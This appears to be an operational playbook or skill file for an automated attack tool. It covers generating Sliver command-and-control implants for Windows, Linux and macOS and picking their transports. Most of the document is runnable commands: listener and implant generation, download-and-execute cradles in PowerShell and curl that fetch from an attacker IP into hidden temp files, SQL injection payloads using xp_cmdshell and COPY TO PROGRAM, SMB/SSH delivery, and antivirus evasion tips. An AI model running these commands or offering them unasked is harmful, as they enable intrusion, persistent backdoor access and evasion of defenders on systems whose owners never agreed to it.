# C2 Deployment — Sliver Implant Generation & Delivery

## Overview

Bridge between initial exploitation and persistent post-exploitation access.
After gaining initial access (RCE, file upload, SSH, SMB), generate a Sliver C2
implant tailored to the target, deliver it, and confirm callback reception.

## Workflow

```
Initial Access → Identify Target OS/Arch → Generate Implant → Select Transport
→ Apply Evasion (if needed) → Deliver Payload → Verify Callback → Interactive Session
```

## Phase 1: Target Identification

Before generating an implant, identify:
- **OS**: Windows, Linux, macOS (from recon/exploitation output)
- **Architecture**: amd64, x86, arm64 (from `uname -m` or systeminfo)
- **Defenses**: AV/EDR present (check process list for MsMpEng.exe, CSFalconService.exe, etc.)
- **Network**: Can the target reach your C2 listener? (check egress rules)

## Phase 2: Implant Generation

### Transport Selection Matrix

| Transport | Stealth | Speed | Firewall Bypass | Best For |
|-----------|---------|-------|-----------------|----------|
| mTLS      | High    | Fast  | Medium          | Internal labs, direct connectivity |
| WireGuard | High    | Fast  | Low             | Persistent tunnels, noise-tolerant |
| HTTPS     | Best    | Medium| Best            | External targets, corporate firewalls |
| DNS       | Best    | Slow  | Best            | Ultra-restrictive networks, last resort |

### Session vs Beacon

| Mode    | Connection  | Stealth | Interactivity | Use When |
|---------|-------------|---------|---------------|----------|
| Session | Persistent  | Lower   | Immediate     | Lab/CTF, speed matters |
| Beacon  | Periodic    | Higher  | Delayed       | External, stealth matters |

### Generate: mTLS Session (Default — Lab/CTF)

```bash
# Start mTLS listener first
sliver > mtls --lhost <KALI_IP> --lport 8888

# Generate Windows implant
sliver > generate --mtls <KALI_IP>:8888 --os windows --arch amd64 \
  --format exe --save /tmp/implant.exe

# Generate Linux implant
sliver > generate --mtls <KALI_IP>:8888 --os linux --arch amd64 \
  --format elf --save /tmp/implant

# Generate macOS implant
sliver > generate --mtls <KALI_IP>:8888 --os darwin --arch amd64 \
  --format macho --save /tmp/implant
```

### Generate: HTTPS Beacon (External/Stealth)

```bash
# Start HTTPS listener
sliver > https --lhost <KALI_IP> --lport 443 --domain updates.example.com

# Generate beacon implant
sliver > generate beacon --http <KALI_IP>:443 --os windows --arch amd64 \
  --format exe --seconds 30 --jitter 50 --save /tmp/beacon.exe

# Shellcode format for injection
sliver > generate --mtls <KALI_IP>:8888 --os windows --arch amd64 \
  --format shellcode --save /tmp/implant.bin
```

### Generate: DNS Beacon (Restrictive Networks)

```bash
# Start DNS listener (requires DNS delegation to your server)
sliver > dns --domains c2.example.com --lhost <KALI_IP>

# Generate DNS implant
sliver > generate beacon --dns c2.example.com --os windows --arch amd64 \
  --save /tmp/dns_beacon.exe
```

### Generate: WireGuard Session

```bash
# Start WireGuard listener
sliver > wg --lhost <KALI_IP> --lport 53 --nport 8888

# Generate WireGuard implant
sliver > generate --wg <KALI_IP>:53 --os linux --arch amd64 \
  --save /tmp/wg_implant
```

### Generate: Stager (Small Footprint)

```bash
# Generate a small stager that downloads the full implant
sliver > generate stager --lhost <KALI_IP> --lport 8443 \
  --protocol tcp --os windows --arch amd64 \
  --format raw --save /tmp/stager.bin

# Or as shellcode for injection
sliver > generate stager --lhost <KALI_IP> --lport 8443 \
  --protocol tcp --os windows --arch amd64 \
  --format c --save /tmp/stager.c
```

### Helper Script (Automated)

```bash
python3 /opt/tazosploit/scripts/generate_implant.py \
  --os <windows|linux|darwin> \
  --arch <amd64|x86|arm64> \
  --transport <mtls|https|dns|wg> \
  --mode <session|beacon> \
  --format <exe|elf|shellcode|dll|shared> \
  --json
```

## Phase 3: Payload Delivery

### Delivery Decision Matrix

| Access Type       | Target OS | Method | Command |
|------------------|-----------|--------|---------|
| RCE (cmd exec)   | Windows   | PowerShell download cradle | `powershell -ep bypass -c "IWR -Uri http://<KALI_IP>/implant.exe -OutFile C:\Windows\Temp\svc.exe; Start-Process C:\Windows\Temp\svc.exe"` |
| RCE (cmd exec)   | Linux     | curl/wget + execute | `curl http://<KALI_IP>/implant -o /tmp/.cache && chmod +x /tmp/.cache && /tmp/.cache &` |
| File Upload       | Any       | Upload via vuln, execute separately | Upload, then trigger execution via LFI/RCE/cron |
| Web Shell         | Any       | Shell → download + execute | Same as RCE above through the web shell |
| SQLi (stacked)    | Windows   | xp_cmdshell | `'; EXEC xp_cmdshell 'powershell -ep bypass -c "IWR ..."';--` |
| SQLi (stacked)    | Linux     | COPY TO PROGRAM | `COPY (SELECT '') TO PROGRAM 'curl http://<KALI_IP>/implant -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x &'` |
| SSH Access        | Linux     | SCP + execute | `scp implant user@target:/tmp/.x && ssh user@target 'chmod +x /tmp/.x && /tmp/.x &'` |
| SMB Access        | Windows   | smbclient upload + PsExec | `smbclient //target/C$ -U user%pass -c 'put implant.exe Windows/Temp/svc.exe'` then PsExec |
| Memory Only       | Windows   | Reflective shellcode injection | Use process injection (see c2_evasion) |

### Start HTTP Staging Server

```bash
# Simple Python HTTP server for hosting payloads
cd /tmp && python3 -m http.server 80 &
```

### Delivery Helper Script

```bash
python3 /opt/tazosploit/scripts/deliver_payload.py \
  --access-type <rce|file_upload|ssh|smb|web_shell|sqli> \
  --implant /tmp/implant.exe \
  --target-os <windows|linux> \
  --kali-ip $(hostname -I | awk '{print $1}') \
  --json
```

## Phase 4: Callback Verification

```bash
# Wait for callback (checks Sliver for new sessions)
python3 /opt/tazosploit/scripts/verify_callback.py \
  --target <TARGET_IP> --mode session --timeout 120 --json

# Manual check in Sliver console
sliver > sessions
sliver > beacons

# Interact with session
sliver > use <SESSION_ID>
sliver [session] > info
sliver [session] > whoami
```

## Troubleshooting

| Problem | Solution |
|---------|----------|
| No callback received | Check firewall: `iptables -L -n`; try different transport (HTTPS/DNS) |
| Implant killed immediately | AV detection → apply evasion pipeline (see c2_evasion skill) |
| Wrong arch | Regenerate for correct arch (`uname -m` on Linux, `echo %PROCESSOR_ARCHITECTURE%` on Windows) |
| Connection refused | Ensure listener is running: `sliver > jobs` |
| DNS implant slow | Normal — DNS transport is slow. Increase beacon interval or switch to HTTPS |
| Stager fails | Try full implant instead of staged; check stager listener with `jobs` |

## Implant Format Reference

| Format    | Extension | OS       | Notes |
|-----------|-----------|----------|-------|
| exe       | .exe      | Windows  | Standard PE executable |
| dll       | .dll      | Windows  | For DLL sideloading/injection |
| shellcode | .bin      | Windows  | Raw shellcode for injection/evasion pipeline |
| elf       | (none)    | Linux    | Standard ELF binary |
| shared    | .so       | Linux    | Shared library for LD_PRELOAD |
| macho     | (none)    | macOS    | Mach-O binary |

## Evidence Collection

- Implant generation command + output hash
- Listener configuration (transport, port, domain)
- Delivery method used and command
- Callback timestamp and session info
- Session ID for all subsequent C2 operations
- Screenshot/info output from initial session
